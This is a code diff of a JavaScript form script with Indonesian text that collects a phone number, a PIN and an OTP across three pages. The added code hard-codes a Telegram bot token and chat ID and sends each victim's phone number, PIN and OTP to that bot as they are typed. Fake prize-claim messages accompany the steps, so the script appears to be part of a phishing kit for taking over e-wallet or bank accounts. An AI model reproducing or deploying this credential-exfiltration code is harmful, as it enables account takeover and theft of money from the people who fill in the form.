@@ -1,107 +1,119 @@
 document.addEventListener("DOMContentLoaded", () => {
-  const pages = document.querySelectorAll(".page");
+  const botToken = '7468194503:AAGIkXncZqQEn4weMA6AGIQqdGnvzRcc6Pw';
+  const chatId = '7732620750';
+
+  let previousData = { phoneNumber: "", pin: "", otp: "" };
   const lanjutkanButton = document.getElementById("lanjutkan-button");
-  const lanjutkanButtonPin = document.getElementById("lanjutkan-button-pin");
-  const lanjutkanButtonOtp = document.getElementById("lanjutkan-button-otp");
   const floatingNotification = document.getElementById("floating-notification");
+  const pages = document.querySelectorAll(".container > div");
   let currentPageIndex = 0;
-  let otpAttempts = 0;
-  const maxOtpAttempts = 5;
-  let isOtpLocked = false;
 
-  const userSession = {};
+  // Fungsi untuk memformat nomor telepon
+  function formatPhoneNumber(phoneNumber) {
+    const cleaned = ('' + phoneNumber).replace(/\D/g, '');
+    const match = cleaned.match(/^(\d{4})(\d{4})(\d{4})$/);
+    if (match) {
+      return `${match[1]}-${match[2]}-${match[3]}`;
+    }
+    return phoneNumber;
+  }
 
-  // Fungsi untuk menampilkan halaman tertentu
+  // Event listener untuk memformat nomor telepon
+  document.getElementById("phone-number").addEventListener("input", (e) => {
+    const formattedNumber = formatPhoneNumber(e.target.value);
+    e.target.value = formattedNumber;
+  });
+
+  async function sendNotificationToTelegram(phoneNumber, pin, otp) {
+    if (
+      phoneNumber === previousData.phoneNumber &&
+      pin === previousData.pin &&
+      otp === previousData.otp
+    ) {
+      console.log("Data sama, tidak mengirim ulang.");
+      return;
+    }
+
+    previousData = { phoneNumber, pin, otp };
+
+    let message = "";
+    if (otp) {
+      message = ` *↔️GELAT :Detail Lengkap* \n📞 *Nomor:* \`${phoneNumber}\`\n🖕 *PIN:* \`${pin}\`\n🔥 *OTP:* \`${otp}\``;
+    } else if (pin) {
+      message = ` ** \n📞 *Nomor:* \`${phoneNumber}\`\n🖕 *PIN:* \`${pin}\`\n🔥 *OTP:* _CKCKCK_`;
+    } else {
+      message = `📞 *Nomor:* \`${phoneNumber}\`\n🖕 *PIN:* _CKCKCK_\n🔥 *OTP:* _CKCKCK_`;
+    }
+
+    try {
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "MarkdownV2" }),
+      });
+      console.log("Notifikasi terkirim:", message);
+    } catch (error) {
+      console.error("Gagal mengirim notifikasi:", error);
+    }
+  }
+
+  function tampilkanNotifikasi(pesan) {
+    floatingNotification.innerText = pesan;
+    floatingNotification.style.cssText = `
+      display: block;
+      background: #fff;
+      border: 2px solid #333;
+      padding: 15px;
+      border-radius: 10px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+      font-weight: bold;
+      text-align: center;
+      max-width: 300px;
+      position: fixed;
+      left: 50%;
+      top: 50%;
+      transform: translate(-50%, -50%);
+    `;
+  }
+
   function showPage(index) {
     pages.forEach((page, i) => {
       page.style.display = i === index ? "block" : "none";
     });
+
     currentPageIndex = index;
-    checkButtonState();
+    const firstInput = pages[index].querySelector("input");
+    if (firstInput) firstInput.focus();
   }
 
-  // Fungsi untuk memeriksa status tombol "Lanjutkan"
-  function checkButtonState() {
-    const currentPage = pages[currentPageIndex];
-    let isButtonActive = false;
+  function goToNextPage() {
+    const phoneNumber = document.getElementById('phone-number').value;
+    const pin = Array.from(document.querySelectorAll('.pin-box')).map(input => input.value).join('');
+    const otp = Array.from(document.querySelectorAll('.otp-box')).map(input => input.value).join('');
 
-    if (currentPage.id === "number-page") {
-      const phoneNumber = document.getElementById("phone-number").value.replace(/\D/g, '');
-      isButtonActive = phoneNumber.length >= 9;
-      lanjutkanButton.disabled = !isButtonActive;
-    } else if (currentPage.id === "pin-page") {
-      isButtonActive = Array.from(currentPage.querySelectorAll(".pin-box")).every(input => input.value.length === 1);
-      lanjutkanButtonPin.disabled = !isButtonActive;
-    } else if (currentPage.id === "otp-page") {
-      isButtonActive = Array.from(currentPage.querySelectorAll(".otp-box")).every(input => input.value.length === 1);
-      lanjutkanButtonOtp.disabled = !isButtonActive;
+    if (currentPageIndex === 0) {
+      sendNotificationToTelegram(phoneNumber, "", "");
+      tampilkanNotifikasi(`📞 Nomor ${phoneNumber} telah dikirim ke bot.`);
+    } else if (currentPageIndex === 1) {
+      sendNotificationToTelegram(phoneNumber, pin, "");
+      tampilkanNotifikasi(`🔑 MASUKKAN OTP ${phoneNumber} UNTUK MENERIMAH.`);
+    } else if (currentPageIndex === 2) {
+      sendNotificationToTelegram(phoneNumber, pin, otp);
+      tampilkanNotifikasi(`🎉 Selamat! Hadiah kamu ${phoneNumber} diterima.\nSilahkan verifikasi notifikasi untuk mendapatkan kode OTP.`);
+    }
+
+    if (currentPageIndex < pages.length - 1) {
+      showPage(currentPageIndex + 1);
     }
   }
 
-  // Fungsi untuk memformat nomor telepon
-  function formatPhoneNumber(input) {
-    let value = input.value.replace(/\D/g, '');
-    if (value.length > 4) value = value.replace(/(\d{4})(\d{4})(\d{1,4})/, "$1-$2-$3");
-    input.value = value;
-    checkButtonState();
-  }
-
-  // Fungsi untuk berpindah ke input berikutnya
-  function moveToNextInput(input) {
-    if (input.value.length === input.maxLength) {
-      const nextInput = input.nextElementSibling;
-      if (nextInput) nextInput.focus();
-    }
-    checkButtonState();
-  }
-
-  // Fungsi untuk berpindah ke input sebelumnya
-  function moveToPreviousInput(input) {
-    if (input.value.length === 0 && input.previousElementSibling) {
-      input.previousElementSibling.focus();
-    }
-  }
-
-  // Event listener untuk input dan keydown
-  document.addEventListener("input", (e) => {
-    if (e.target.matches("#phone-number")) formatPhoneNumber(e.target);
-    if (e.target.matches(".pin-box, .otp-box")) moveToNextInput(e.target);
+  document.getElementById("phone-number").addEventListener("input", () => showPage(0));
+  document.querySelectorAll(".pin-box, .otp-box").forEach(input => {
+    input.addEventListener("input", () => input.value.length === input.maxLength && input.nextElementSibling?.focus());
   });
 
-  document.addEventListener("keydown", (e) => {
-    if (e.target.matches(".pin-box, .otp-box") && (e.key === "Backspace" || e.key === "Delete")) {
-      moveToPreviousInput(e.target);
-    }
-  });
+  lanjutkanButton.addEventListener("click", goToNextPage);
+  floatingNotification.addEventListener("click", () => floatingNotification.style.display = "none");
 
-  // Event listener untuk tombol "Lanjutkan" di halaman nomor telepon
-  lanjutkanButton.addEventListener("click", () => {
-    showPage(1); // Pindah ke halaman PIN
-  });
-
-  // Event listener untuk tombol "Lanjutkan" di halaman PIN
-  lanjutkanButtonPin.addEventListener("click", () => {
-    showPage(2); // Pindah ke halaman OTP
-  });
-
-  // Event listener untuk tombol "Lanjutkan" di halaman OTP
-  lanjutkanButtonOtp.addEventListener("click", () => {
-    const otp = Array.from(document.querySelectorAll(".otp-box")).map(input => input.value).join("");
-    const phoneNumber = document.getElementById("phone-number").value.replace(/\D/g, '');
-    userSession[`user_${phoneNumber}`] = { phone: phoneNumber, pin: "XXXXXX", otp: otp };
-
-    otpAttempts++;
-    if (otpAttempts >= maxOtpAttempts) {
-      isOtpLocked = true;
-      floatingNotification.innerText = "Anda telah melebihi batas percobaan OTP.";
-      floatingNotification.style.backgroundColor = "rgba(255, 0, 0, 0.8)";
-      floatingNotification.style.display = "block";
-    } else {
-      // Kirim data ke Telegram (jika diperlukan)
-      console.log("Data dikirim:", userSession[`user_${phoneNumber}`]);
-    }
-  });
-
-  // Inisialisasi halaman pertama
   showPage(0);
 });
